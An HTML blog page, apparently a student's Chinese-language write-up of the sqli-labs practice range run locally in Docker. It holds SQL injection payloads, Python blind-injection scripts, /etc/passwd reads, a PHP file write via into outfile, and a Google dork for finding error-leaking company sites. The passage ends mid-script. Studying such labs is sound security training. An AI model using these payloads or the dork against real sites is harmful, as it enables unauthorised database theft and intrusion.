@@ -1,0 +1,1453 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - sqli-labs学习记录</title>
+        <meta name="description" content="有时间就要学习 学习过程阅读题目源码，理解漏洞的成因 环境搭建 使用docker部署，简单方便一些，即开即用 映射到主机8080端口 docker pull acgpiano/sqli-labs docker run -dt --name sqli-lab -p 8080:80 acgpiano/sqli-labs:l…">
+    <link rel="canonical" href="https://the0n3.top/pages/sqli-labs/">
+    <!-- Open Graph -->
+    <meta property="og:title" content="sqli-labs学习记录">
+    <meta property="og:description" content="有时间就要学习 学习过程阅读题目源码，理解漏洞的成因 环境搭建 使用docker部署，简单方便一些，即开即用 映射到主机8080端口 docker pull acgpiano/sqli-labs docker run -dt --name sqli-lab -p 8080:80 acgpiano/sqli-labs:l…">
+    <meta property="og:url" content="https://the0n3.top/pages/sqli-labs/">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="the0n3">
+    <meta property="og:locale" content="zh_CN">
+        <meta property="og:image" content="https://the0n3.top/images/sqli-labs/1.png">
+        <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="sqli-labs学习记录">
+    <meta name="twitter:description" content="有时间就要学习 学习过程阅读题目源码，理解漏洞的成因 环境搭建 使用docker部署，简单方便一些，即开即用 映射到主机8080端口 docker pull acgpiano/sqli-labs docker run -dt --name sqli-lab -p 8080:80 acgpiano/sqli-labs:l…">
+        <meta name="twitter:image" content="https://the0n3.top/images/sqli-labs/1.png">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+    <!-- 功能样式（自动扫描 assets/features/ 目录） -->
+        <link rel="stylesheet" href="/assets/features/code-fold/style.css">
+        <link rel="stylesheet" href="/assets/features/image-enhance/style.css">
+        <link rel="stylesheet" href="/assets/features/reading-progress/style.css">
+        <link rel="stylesheet" href="/assets/features/tax-accordion/style.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <link rel="stylesheet" href="/assets/css/search.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+    <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+    <header>
+        <nav>
+            <div class="nav-right">
+                                <a href="/">首页</a>
+                                <a href="/archives/">归档</a>
+                                <a href="/categories/">分类</a>
+                                <a href="/tags/">标签</a>
+                                <a href="/friends/">友链</a>
+                                <a href="/about/">关于</a>
+                                <a href="https://www.travellings.cn/go.html">开往</a>
+                                                <button
+                    id="searchTrigger"
+                    class="search-trigger"
+                    type="button"
+                    aria-label="打开搜索"
+                    aria-haspopup="dialog"
+                    aria-controls="searchModal"
+                    title="搜索（/）"
+                >
+                    <span class="search-trigger__label">搜索</span>
+                    <span class="search-trigger__hint">/</span>
+                </button>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>sqli-labs学习记录</h1>
+    <p>
+        <span class="meta">发布于: 2025-03-05 22:01</span>
+    </p>
+    <div class="post-body">
+        <p>有时间就要学习</p>
+<p><img src="/images/sqli-labs/1.png" alt="1" decoding="async" width="288" height="192"></p>
+<p>学习过程阅读题目源码，理解漏洞的成因</p>
+<h2>环境搭建</h2>
+<p>使用docker部署，简单方便一些，即开即用</p>
+<p>映射到主机8080端口</p>
+<pre><code class="language-bash">docker pull acgpiano/sqli-labs
+docker run -dt --name sqli-lab -p 8080:80 acgpiano/sqli-labs:latest</code></pre>
+<p>进入靶场首页，点击<code>Setup/reset Database for labs</code>，初始化数据库</p>
+<h2>唠叨</h2>
+<p>看到前面几关前缀，<code>GET-Error based</code>，都是基于报错注入的，这个比较好玩，经典的话通过引号闭合可以使sql语句报错</p>
+<p>本身执行一个sql语句不会把错误信息返回前端，报错主要由于使用了函数<code>mysql_error()</code>、<code>mysqli_error()</code>，返回了mysql的错误信息</p>
+<pre><code class="language-plaintext">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1</code></pre>
+<p>一些站点甚至没有处理参数空值的情况，导致本身就已经闭合，例如</p>
+<h3>字符型</h3>
+<pre><code class="language-php">$id = $_GET['id'];
+$sql = "SELECT * FROM users WHERE id = '$id'";</code></pre>
+<p>id为空时，sql语句变成了</p>
+<pre><code class="language-sql">select * from users where id = '';</code></pre>
+<h3>数字型</h3>
+<pre><code class="language-php">$id = $_GET['id'];
+$sql = "SELECT * FROM users WHERE id = $id";</code></pre>
+<p>id为空时，sql语句变成了</p>
+<pre><code class="language-sql">select * from users where id = ;</code></pre>
+<p>这样页面本身就可能存在报错，可以尝试谷歌语法，收集信息找到这类站点。看看得了，没有授权不要测别人网站</p>
+<pre><code class="language-ini">inurl:"?id=" intext:"You have an error in your SQL syntax" "公司"</code></pre>
+<p><img src="/images/sqli-labs/2.png" alt="2" decoding="async" loading="lazy" width="409" height="237"></p>
+<h2>Less-1</h2>
+<p>get传参 <code>?id=1'</code>时页面报错，可以猜测后台sql语句类似</p>
+<p><img src="/images/sqli-labs/3.png" alt="3" decoding="async" loading="lazy" width="1465" height="478"></p>
+<pre><code class="language-sql">$id = $_GET['id'];
+$sql = "select * from users where id = '$id'";</code></pre>
+<p>传进去的单引号闭合了原有sql语句，后面多出一个单引号报错，使用<code>#</code>把后面注释掉后面多出的单引号就不会再报错，get传<code>#</code>时使用url编码值<code>%23</code>，所以传<code>?id=1%23</code>时不会报错</p>
+<p>有了sql注入点，尝试爆数据库信息，使用联合查询爆数据库信息时，要注意前后select的字段数相同，可以先使用<code>order by</code>爆字段数</p>
+<p>在3时不报错，4时报错，说明有3个字段</p>
+<pre><code class="language-sql">?id=1' order by 3%23</code></pre>
+<p>尝试联合查询，2、3是回显位</p>
+<pre><code class="language-sql">?id=0' union select 1,2,3%23</code></pre>
+<p><img src="/images/sqli-labs/4.png" alt="4" decoding="async" loading="lazy" width="1139" height="460"></p>
+<p>爆数据库名</p>
+<pre><code class="language-sql">?id=0'union select 1,2,group_concat(schema_name) from information_schema.schemata%23</code></pre>
+<p>爆表名</p>
+<pre><code class="language-sql">?id=0'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23</code></pre>
+<p>爆列名</p>
+<pre><code class="language-sql">?id=0'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'%23</code></pre>
+<p>爆数据</p>
+<pre><code class="language-sql">?id=0'union select 1,2,group_concat(username,password) from users%23</code></pre>
+<h2>Less-2</h2>
+<p>传入<code>?id=1'</code>、<code>?id=1"</code>时页面报错，猜测后台sql语句类似</p>
+<pre><code class="language-sql">$sql = "select * from users where id = $id";</code></pre>
+<p>后台需要整型参数id，传入字符型参数id时，sql语句多出了引号导致报错，这题就不再需要引号的闭合，直接拼接sql语句</p>
+<pre><code class="language-sql">?id=0 or 1=1%23</code></pre>
+<h2>Less-3</h2>
+<p>传入参数<code>?id=1'</code>时，页面报错，传入参数<code>?id=1</code>、<code>?id=1"</code>时页面没有报错，猜测后台sql语句类似</p>
+<pre><code class="language-sql">$sql = "select * from users where id = '$id'";</code></pre>
+<p>传入参数<code>?id=1'</code>时，sql语句变成了</p>
+<pre><code class="language-sql">select * from users where id = '1''</code></pre>
+<p>可以传<code>?id=1'</code>，把原有的单引号以及后面内容注释掉，保证sql语句正确。后面正常拼接联合查询sql语句即可</p>
+<pre><code class="language-sql">?id=0' or 1=1%23</code></pre>
+<h2>Less-4</h2>
+<p>传入参数<code>?id=1"</code>时，页面报错，传入参数<code>?id=1</code>、<code>?id=1'</code>时页面没有报错，猜测后台sql语句类似</p>
+<pre><code class="language-php">$id = '"'.$_GET['id'].'"';
+$sql = "select * from users where id = ($id)";</code></pre>
+<p>传入参数<code>?id=1"</code>时，sql语句变成了</p>
+<pre><code class="language-sql">select * from users where id = ("1"")</code></pre>
+<p><img src="/images/sqli-labs/5.png" alt="5" decoding="async" loading="lazy" width="572" height="52"></p>
+<p>所以页面报错，报错里的信息暴露了后台sql语句<code>"1"")</code>，可以猜测使用的是<code>($id)</code></p>
+<pre><code class="language-plaintext">for the right syntax to use near '"1"")LIMIT 0,1' at line 1</code></pre>
+<p>可以传<code>?id=1") or 1=1%23</code>，把原有的双引号、括号以及后面内容注释掉，保证sql语句正确。后面正常拼接联合查询sql语句即可</p>
+<pre><code class="language-sql">?id=0") or 1=1%23</code></pre>
+<p>经过php处理id后，id拼接成了<code>"0") or 1=1%23"</code>，sql语句变成了</p>
+<pre><code class="language-sql">select * from users where id = ("0") or 1=1%23</code></pre>
+<p>接着就是正常爆库爆表操作</p>
+<pre><code class="language-sql">?id=0") or 1=1%23</code></pre>
+<h2>Less-5</h2>
+<p>像前面一样，通过传入<code>?id=1'</code>、<code>?id=1"</code>、<code>?id=1'</code>等参数，在<code>?id=1'</code>时页面报错<code>right syntax to use near ''1'' LIMIT 0,1'</code>，猜测后台sql语句类似</p>
+<pre><code class="language-sql">$id = $_GET['id'];
+$sql = "select * from users where id = '$id'";</code></pre>
+<h3>布尔盲注</h3>
+<p>区别于前几题，这里没有回显位，只有两种结果<code>You are in...</code>和无回显</p>
+<p>写了一个布尔盲注脚本</p>
+<p>这个利用了<code>substr()</code>函数，通过回显是否包含<code>You are in</code>，来判断爆破的每一位是否正确</p>
+<pre><code class="language-python">import requests
+import string
+import time
+# 下划线放最后，避免当作统配符吃掉特殊字符
+flags = 'abcdefghijklmnopqrstuvwxyz0123456789,-\{\}_'
+flag = ""
+
+url = "http://192.168.6.246:8080/Less-5/"
+i = 1
+print("脚本正在运行.......")
+while True:
+    for s in flags:
+        # 爆库
+        id = "99'or substr((select group_concat(schema_name) from information_schema.schemata)," + str(i)+",1)='"+s+"'%23"
+        # 爆表
+        # id = "99'or substr((select group_concat(table_name) from information_schema.tables where table_schema=database())," + str(i)+",1)='"+s+"'%23"
+        # 爆字段
+        # id = "99'or substr((select group_concat(column_name) from information_schema.columns where table_schema=database())," + str(i)+",1)='"+s+"'%23"
+        tmp_url = url + "?id=" + id
+        resp = requests.get(tmp_url)
+
+        if "You are in" in resp.text:
+            i += 1
+            flag += s
+            # 最后一次成功拼接作为开始，判断超时
+            start = time.time()
+            print(f"[#]------{flag}")
+            break
+        else:
+            pass
+    end = time.time()
+    # 目标服务器性能可能存在差距，适当调整超时时间
+    try:
+        if end - start &gt; 1.5:
+            if flag != "":
+                print("盲注结束，检查flag是否是预期结果！")
+            else:
+                print("检测到长时间没有再获取到响应，该脚本布尔盲注可能并不适配退出")
+            exit()  
+    except NameError:
+        print("在第一轮循环中未找到合适的开始字符，检查环境是否适合布尔盲注或扩充flags变量(可能出现的字符")
+        exit()</code></pre>
+<p><img src="/images/sqli-labs/6.png" alt="6" decoding="async" loading="lazy" width="835" height="645"></p>
+<p>使用<code>left()</code>、<code>right()</code>函数实现，<code>right()</code>函数按照<code>left()</code>模板补充即可</p>
+<pre><code class="language-python">import requests
+import string
+import time
+# 下划线放最后，避免当作统配符吃掉特殊字符
+flags = 'abcdefghijklmnopqrstuvwxyz0123456789,-\{\}_'
+flag = ""
+
+url = "http://127.0.0.1:8080/Less-5/"
+i = 1
+print("脚本正在运行.......")
+while True:
+
+    for s in flags:
+        # 爆库
+        # id = "99'or left((select group_concat(schema_name) from information_schema.schemata)," + str(i)+")='"+ flag + s+"'%23"
+        # 爆表
+        # id = "99'or left((select group_concat(table_name) from information_schema.tables where table_schema=database())," + str(i)+")='"+ flag + s +"'%23"
+        # 爆字段
+        # id = "99'or left((select group_concat(column_name) from information_schema.columns where table_schema=database())," + str(i)+")='"+ flag + s+"'%23"
+
+        # 测试right函数
+        # id = "99'or right((select group_concat(schema_name) from information_schema.schemata)," + str(i)+")='"+ s + flag +"'%23"
+        tmp_url = url + "?id=" + id
+        resp = requests.get(tmp_url)
+
+        if "You are in" in resp.text:
+            i += 1
+            flag += s
+            # 测试right函数
+            # flag = s + flag
+            # 最后一次成功拼接作为开始，判断超时
+            start = time.time()
+            print(f"[#]------{flag}")
+            break
+        else:
+            pass
+    end = time.time()
+    # 目标服务器性能可能存在差距，适当调整超时时间
+    try:
+        if end - start &gt; 1.5:
+            if flag != "":
+                print("盲注结束，检查flag是否是预期结果！")
+            else:
+                print("检测到长时间没有再获取到响应，该脚本布尔盲注可能并不适配退出")
+            exit()  
+    except NameError:
+        print("在第一轮循环中未找到合适的开始字符，检查环境是否适合布尔盲注或扩充flags变量(可能出现的字符")
+        exit()</code></pre>
+<p><img src="/images/sqli-labs/9.png" alt="9" decoding="async" loading="lazy" width="1315" height="914"></p>
+<p>使用<code>like</code>代替<code>=</code>实现盲注</p>
+<pre><code class="language-python">import requests
+import string
+import time
+# 下划线放最后，避免当作统配符吃掉特殊字符
+flags = 'abcdefghijklmnopqrstuvwxyz0123456789,-\{\}_'
+flag = ""
+
+url = "http://127.0.0.1:8080/Less-5/"
+i = 1
+start = None  # 初始化 start 变量
+print("脚本正在运行.......")
+while True:
+
+    for s in flags:
+        # 爆库
+        id = "99'or left((select group_concat(schema_name) from information_schema.schemata)," + str(i)+") like '"+ flag + s + "%25" +"'%23"
+        # 爆表
+        # id = "99'or left((select group_concat(table_name) from information_schema.tables where table_schema=database())," + str(i)+")='"+ flag + s +"'%23"
+        # 爆字段
+        # id = "99'or left((select group_concat(column_name) from information_schema.columns where table_schema=database())," + str(i)+")='"+ flag + s+"'%23"
+
+        tmp_url = url + "?id=" + id
+        resp = requests.get(tmp_url)
+
+        if "You are in" in resp.text:
+            i += 1
+            flag += s
+            # 最后一次成功拼接作为开始，判断超时
+            start = time.time()
+            print(f"[#]------{flag}")
+            break
+        else:
+            pass
+    end = time.time()
+    # 目标服务器性能可能存在差距，适当调整超时时间
+    try:
+        if (end-start)&gt;1.5:
+            if flag != "":
+                print("盲注结束，检查flag是否是预期结果！")
+            else:
+                print("检测到长时间没有再获取到响应，该脚本布尔盲注可能并不适配退出")
+            exit()  
+    except NameError:
+        print("在第一轮循环中未找到合适的开始字符，检查环境是否适合布尔盲注或扩充flags变量(可能出现的字符")</code></pre>
+<h3>报错注入</h3>
+<p>主播主播，你的布尔盲注确实很强，但还是太痴操作了，有没有更简单一点的？</p>
+<p>有的兄弟，有的。既然页面在语法错误时会报错，那么还可以使用报错注入来回显结果</p>
+<p>使用<code>updatexml()</code>、<code>extractvalue()</code>、<code>floor()</code>等函数，可以回显错误信息，实现爆库爆表爆列爆数据</p>
+<p>看一下这个函数用法</p>
+<p><img src="/images/show-sql/2441.png" alt="2441" decoding="async" loading="lazy" width="1274" height="743"></p>
+<p>报错注入为什么存在错误，还能返回部分语句的结果？</p>
+<p>sql先检查是否存在语法错误，如果没有，先执行子查询，在进行updatexml函数的调用，最后因为updatexml函数的参数类型错误，导致抛出错误，在报错中，带出了子查询的结果</p>
+<p>流程：</p>
+<ul>
+<li>检查语法</li>
+<li>执行子查询</li>
+<li>执行updatexml函数</li>
+<li>updatexml函数参数类型错误，抛出错误</li>
+</ul>
+<p>例如下面这句，不存在语法错误，执行<code>database()</code>函数子查询<code>select database()</code>，再执行<code>concat()</code>函数，最后再拼接时，<code>updatexml</code>函数使用了错误的参数类型，报错:</p>
+<pre><code class="language-sql">select updatexml(1,concat(0x7e,database(),0x7e),1)</code></pre>
+<p>爆库</p>
+<pre><code class="language-sql">?id=0' and updatexml(1,concat(0x7e,database(),0x7e),1)%23</code></pre>
+<p>把<code>database()</code>函数位置换成select子句，爆表</p>
+<pre><code class="language-sql">?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23</code></pre>
+<p>爆字段</p>
+<pre><code class="language-sql">?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database()),0x7e),1)%23</code></pre>
+<p>爆数据</p>
+<pre><code class="language-sql">?id=1' and updatexml(1,concat(0x7e,(select group_concat(username,password) from users),0x7e),1)%23</code></pre>
+<p>尝试使用<code>extractvalue()</code>、<code>floor()</code>函数</p>
+<p><code>extractvalue()</code>函数和<code>updatexml()</code>函数使用类似，参数个数不同</p>
+<pre><code class="language-sql">slect username,password from users where id = 1 and extractvalue(1,0x7e);</code></pre>
+<p>在这里，<code>extractvalue()</code>函数第二个参数使用了错误的参数<code>0x7e</code>，报错。可以只是<code>concat()</code>函数，使用子查询获取想要的内容，拼接上<code>0x7e</code>，把子查询结果带出来</p>
+<p><img src="/images/sqli-labs/7.png" alt="7" decoding="async" loading="lazy" width="870" height="298"></p>
+<p>爆库</p>
+<pre><code class="language-sql">?id=0' and extractvalue(1,concat(0x7e,database(),0x7e))%23</code></pre>
+<p><img src="/images/sqli-labs/8.png" alt="8" decoding="async" loading="lazy" width="892" height="264"></p>
+<p>另外，<code>XPATH syntax error</code>也算是<code>updatexml</code>、<code>extractvalue</code>因为XPATH报错的一个特征吧</p>
+<h2>Less-6</h2>
+<p>和上一关less-5相同，换成了<code>"</code>双引号类型</p>
+<p>上面的盲注脚本和报错注入稍微修改还能用</p>
+<p><img src="/images/sqli-labs/11.png" alt="11" decoding="async" loading="lazy" width="1500" height="283"></p>
+<h2>Less-7</h2>
+<h3>读写文件</h3>
+<p>这题提示需要<code>use outfile</code>，没有回显，要把数据写入到文件里，可以写入一个木马</p>
+<p>我的题目环境是使用docker部署的，完整网络根路径我并不知道，但是可以知道现在遇到的题目都是在<code>Less-n</code>目录下</p>
+<p>回到前面几关，尝试验证路径</p>
+<p>在<code>Less-1</code>中，使用<code>?id=0' union select 1,2,load_file('/etc/passwd')%23</code>读取<code>/etc/passwd</code>，存在<code>www-data</code>用户，用户目录<code>/var/www/</code>，猜测网站更目录大概是<code>/var/www/html/</code></p>
+<p><img src="/images/sqli-labs/12.png" alt="12" decoding="async" loading="lazy" width="1120" height="491"></p>
+<p>尝试读取<code>/var/www/html/Less-1/index.php</code>文件，成功读取到内容，可以验证根目录<code>/var/www/html/</code></p>
+<p><img src="/images/sqli-labs/13.png" alt="13" decoding="async" loading="lazy" width="1168" height="501"></p>
+<p>可以尝试在<code>Less-7</code>题目页面写入木马</p>
+<p>传入参数<code>?id=1</code>、<code>?id=1"</code>时页面正常，传入<code>?id=1'</code>时报错，尝试传入<code>?id=1'%23</code>注释掉后面内容时，页面仍然报错</p>
+<p><img src="/images/sqli-labs/14.png" alt="14" decoding="async" loading="lazy" width="999" height="338">
+测试可以发现，在传入<code>?id=1'))%23</code>时，页面正常，可以猜测后台sql语句类似</p>
+<pre><code class="language-php">$id = $_GET['id'];
+$sql = "select * from users where id = (('$id'))";</code></pre>
+<p>尝试写入木马，检查没有语法错误，页面提示<code>You have an error in your SQL syntax</code></p>
+<pre><code class="language-php">?id=0')) union select 1,2,'&lt;?=phpinfo();?&gt;' into outfile "/var/www/html/Less-7/abc.php"%23</code></pre>
+<p>回到<code>Less-1</code>环境简单验证，在写入木马时，提示<code>Can't create/write to file '/var/www/html/Less-7/abc.php' (Errcode: 13)</code></p>
+<p><img src="/images/sqli-labs/15.png" alt="15" decoding="async" loading="lazy" width="865" height="128"></p>
+<p>大佬提示<code>错误代码为 13 的时候是没有权限，可以考虑/tmp 等文件夹</code></p>
+<p><code>/var/www/html/</code>目录没有写的权限，这里不能像其他writeup一样写木马了。尝试把数据库信息写入到<code>/tmp</code>目录</p>
+<pre><code class="language-php">```php
+url/Less-7/?id=0')) union select 1,2,'fuck' into outfile "/tmp/fuck"%23</code></pre>
+<p>在<code>Less-1</code>环境里读取，验证成功写入</p>
+<p><img src="/images/sqli-labs/16.png" alt="16" decoding="async" loading="lazy" width="1021" height="303"></p>
+<h3>解决权限问题</h3>
+<p>这个docker镜像作者可能没考虑到权限问题，可以进入容器给权限</p>
+<pre><code class="language-bash">docker exec -it sqli-lab /bin/sh
+chmod 777 -R /var/www/html/</code></pre>
+<p>现在应该可以正常写入文件了</p>
+<pre><code class="language-php">?id=0')) union select 1,2,'&lt;?=phpinfo();?&gt;' into outfile "/var/www/html/Less-7/abc.php"%23</code></pre>
+<p><img src="/images/sqli-labs/777.png" alt="777" decoding="async" loading="lazy" width="1062" height="548"></p>
+<h3>布尔盲注</h3>
+<p>因为题目还是有两种响应，尝试布尔盲注</p>
+<ul>
+<li>true : <code>You are in...</code></li>
+<li>false : <code>You have an error in your SQL syntax</code></li>
+</ul>
+<p>布尔盲注</p>
+<pre><code class="language-python">import requests
+import string
+import time
+# 下划线放最后，避免当作统配符吃掉特殊字符
+flags = 'abcdefghijklmnopqrstuvwxyz0123456789,-\{\}_'
+flag = ""
+
+url = "http://127.0.0.1:8080/Less-7/"
+i = 1
+print("脚本正在运行.......")
+while True:
+
+    for s in flags:
+        # 爆库
+        # id = "0')) or left((select group_concat(schema_name) from information_schema.schemata)," + str(i)+")='"+ flag + s+"'%23"
+        # 爆表
+        id = "0')) or left((select group_concat(table_name) from information_schema.tables where table_schema=database())," + str(i)+")='"+ flag + s +"'%23"
+        # 爆字段
+        # id = "0')) or left((select group_concat(column_name) from information_schema.columns where table_schema=database())," + str(i)+")='"+ flag + s+"'%23"
+
+        # 测试right函数
+        # id = "90')) or right((select group_concat(schema_name) from information_schema.schemata)," + str(i)+")='"+ s + flag +"'%23"
+        tmp_url = url + "?id=" + id
+        resp = requests.get(tmp_url)
+
+        if "You are in" in resp.text:
+            i += 1
+            flag += s
+            # 测试right函数
+            # flag = s + flag
+            # 最后一次成功拼接作为开始，判断超时
+            start = time.time()
+            print(f"[#]------{flag}")
+            break
+        else:
+            pass
+    end = time.time()
+    # 目标服务器性能可能存在差距，适当调整超时时间
+    try:
+        if end - start &gt; 1.5:
+            if flag != "":
+                print("盲注结束，检查flag是否是预期结果！")
+            else:
+                print("检测到长时间没有再获取到响应，该脚本布尔盲注可能并不适配退出")
+            exit()  
+    except NameError:
+        print("在第一轮循环中未找到合适的开始字符，检查环境是否适合布尔盲注或扩充flags变量(可能出现的字符")
+        exit()</code></pre>
+<p><img src="/images/sqli-labs/17.png" alt="17" decoding="async" loading="lazy" width="1053" height="814"></p>
+<h3>时间盲注</h3>
+<pre><code class="language-python">import requests
+import string
+import time
+# 下划线放最后，避免当作统配符吃掉特殊字符
+flags = 'abcdefghijklmnopqrstuvwxyz0123456789,-\{\}_'
+flag = ""
+
+url = "http://127.0.0.1:8080/Less-7/"
+i = 1
+print("脚本正在运行.......")
+while True:
+
+    for s in flags:
+        # 爆库
+        # id = "0')) or if((substr((select group_concat(schema_name) from information_schema.schemata)," + str(i)+",1)='"+ s +"'),sleep(0.1),0)%23"
+        # 爆表
+        # id = "0')) or if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database())," + str(i)+",1)='"+ s +"'),sleep(0.1),0)%23"
+        # 爆字段
+        id = "0')) or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database())," + str(i)+",1)='"+ s +"'),sleep(0.1),0)%23"
+        tmp_url = url + "?id=" + id
+        start = time.time()
+        resp = requests.get(tmp_url)
+        end = time.time()
+        if end - start &gt; 0.1:
+            flag += s
+            # 当盲注出正确字符时，才去盲注下一位(变量i的作用)
+            i += 1
+            print(f"[#]------result: {flag}")
+            break
+        elif end - start &gt; 5:
+            print("跑了这么久，跑完了吗？跑完我给你停了🤓👍")
+            exit()
+        else:
+            pass</code></pre>
+<h2>Less-8</h2>
+<h3>布尔盲注</h3>
+<p>看源码里特别的一句，注释掉了mysql抛出错误的代码语句，这题不能再使用报错注入</p>
+<pre><code class="language-php">//print_r(mysql_error());</code></pre>
+<p><img src="/images/sqli-labs/18.png" alt="18" decoding="async" loading="lazy" width="612" height="454"></p>
+<p>通过传入参数<code>?id=1' or 1=1%23</code>、<code>?id=1" or 1=1%23</code>，在<code>?id=1'or 1=1%23</code>时页面正常，还是单引号包裹的<code>id</code></p>
+<p>布尔盲注</p>
+<pre><code class="language-python">import requests
+import string
+import time
+# 下划线放最后，避免当作统配符吃掉特殊字符
+flags = 'abcdefghijklmnopqrstuvwxyz0123456789,-\{\}_'
+flag = ""
+
+url = "http://127.0.0.1:8080/Less-8/"
+i = 1
+print("脚本正在运行.......")
+while True:
+
+    for s in flags:
+        # 爆库
+        id = "0' or left((select group_concat(schema_name) from information_schema.schemata)," + str(i)+")='"+ flag + s+"'%23"
+        # 爆表
+        # id = "0' or left((select group_concat(table_name) from information_schema.tables where table_schema=database())," + str(i)+")='"+ flag + s +"'%23"
+        # 爆字段
+        # id = "0' or left((select group_concat(column_name) from information_schema.columns where table_schema=database())," + str(i)+")='"+ flag + s +"'%23"
+        tmp_url = url + "?id=" + id
+        resp = requests.get(tmp_url)
+
+        if "You are in" in resp.text:
+            flag += s
+            i += 1
+            # 最后一次成功拼接作为开始，判断超时
+            start = time.time()
+            print(f"[#]------{flag}")
+            break
+        else:
+            pass
+    end = time.time()
+    # 目标服务器性能可能存在差距，适当调整超时时间
+    try:
+        if end - start &gt; 1.5:
+            if flag != "":
+                print("盲注结束，检查flag是否是预期结果！")
+            else:
+                print("检测到长时间没有再获取到响应，该脚本布尔盲注可能并不适配退出")
+            exit()  
+    except NameError:
+        print("在第一轮循环中未找到合适的开始字符，检查环境是否适合布尔盲注或扩充flags变量(可能出现的字符")
+        exit()</code></pre>
+<p><img src="/images/sqli-labs/19.png" alt="19" decoding="async" loading="lazy" width="972" height="757"></p>
+<h3>时间盲注</h3>
+<pre><code class="language-python">import requests
+import string
+import time
+# 下划线放最后，避免当作统配符吃掉特殊字符
+flags = 'abcdefghijklmnopqrstuvwxyz0123456789,-\{\}_'
+flag = ""
+
+url = "http://127.0.0.1:8080/Less-8/"
+i = 1
+print("脚本正在运行.......")
+while True:
+
+    for s in flags:
+        # 爆库
+        # id = "0' or if((substr((select group_concat(schema_name) from information_schema.schemata)," + str(i)+",1)='"+ s +"'),sleep(0.1),0)%23"
+        # 爆表
+        # id = "0' or if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database())," + str(i)+",1)='"+ s +"'),sleep(0.1),0)%23"
+        # 爆字段
+        id = "0' or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database())," + str(i)+",1)='"+ s +"'),sleep(0.1),0)%23"
+        tmp_url = url + "?id=" + id
+        start = time.time()
+        resp = requests.get(tmp_url)
+        end = time.time()
+        if end - start &gt; 0.1:
+            flag += s
+            # 当盲注出正确字符时，才去盲注下一位(变量i的作用)
+            i += 1
+            print(f"[#]------result: {flag}")
+            break
+        elif end - start &gt; 2:
+            print("跑了这么久，跑完了吗？跑完我给你停了🤓👍")
+            exit()
+        else:
+            pass</code></pre>
+<h2>Less-9</h2>
+<p>无论输入什么，页面只有<code>You are in...........</code>，只能用时间盲注了</p>
+<p>在传入<code>?id=0' or if(1=1,sleep(5),sleep(5))</code>时，页面长时间加载，说明存在时间盲注</p>
+<p>上题脚本，稍加修改还能用</p>
+<h2>Less-10</h2>
+<p>基于时间盲注的双引号类型参数</p>
+<p>上面时间盲注脚本还能梭哈</p>
+<h2>Less-11</h2>
+<p>这里开始使用post参数，通过测试，可以猜测后台使用的单引号包裹的参数，在用户名或密码出都可以尝试使用万能密码</p>
+<p><img src="/images/sqli-labs/21.png" alt="21" decoding="async" loading="lazy" width="1087" height="403"></p>
+<p><img src="/images/sqli-labs/20.png" alt="20" decoding="async" loading="lazy" width="1064" height="581"></p>
+<p>在后台，sql语句可能是这样的</p>
+<pre><code class="language-sql">$sql = "select * from users where username = '$username' and password = '$password'";</code></pre>
+<p>用户名和密码是<code>and</code>连接的，拼接or以后，同时存在<code>or</code>和<code>and</code>，会怎么处理？<code>and</code>的优先级更高，会先执行<code>and</code>，再执行<code>or</code></p>
+<ul>
+<li>
+<p>如果在用户名处做文章，可以把后面的and注释掉，不再考虑。我们拼接后得到的sql语句可能是这样的，不需要考虑用户名密码是什么</p>
+<pre><code class="language-sql">select * from users where username = 'admin' or 1=1 # and password = '123456';</code></pre>
+</li>
+<li>
+<p>如果从密码入手，可以尝试在密码处拼接<code>or 1=1</code>，这样密码永远为真，sql语句可能是这样的，即使用户名密码<code>and</code>结果是<code>false</code>，在<code>or 1=1</code>的作用下，sql语句永远为真</p>
+</li>
+</ul>
+<pre><code class="language-sql">select * from users where username = 'admin' and password = '123456' or 1=1;</code></pre>
+<p><img src="/images/sqli-labs/22.png" alt="22" decoding="async" loading="lazy" width="1069" height="387"></p>
+<p>这里回显用户名密码的逻辑有点怪，生产环境应该....应该用 盲注、写马☝🤓</p>
+<h2>Less-12</h2>
+<p>用户名带<code>"</code>双引号时，sql报错，爆出了一部分sql语句，可以看出是用<code>("")</code>包裹的参数</p>
+<p>猜测后台sql语句</p>
+<pre><code class="language-sql">$username = '"'.$_POST['username'].'"';
+$password = '"'.$_POST['password'].'"';
+$sql = "select * from users where username = ($username) and password = ($password)";</code></pre>
+<p>闭合双引号括号，题前结束sql语句，完成验证</p>
+<pre><code class="language-sql">select * from users where username = ("1") or 1=1#") and password = ("123456");</code></pre>
+<p><img src="/images/sqli-labs/24.png" alt="24" decoding="async" loading="lazy" width="1068" height="427"></p>
+<h2>Less-13</h2>
+<p>类似上一关，区别：使用<code>1')#</code>闭合单引号、括号后没有回显了，这才像正常登录逻辑</p>
+<p>时间盲注</p>
+<pre><code class="language-python">import requests
+import string
+import time
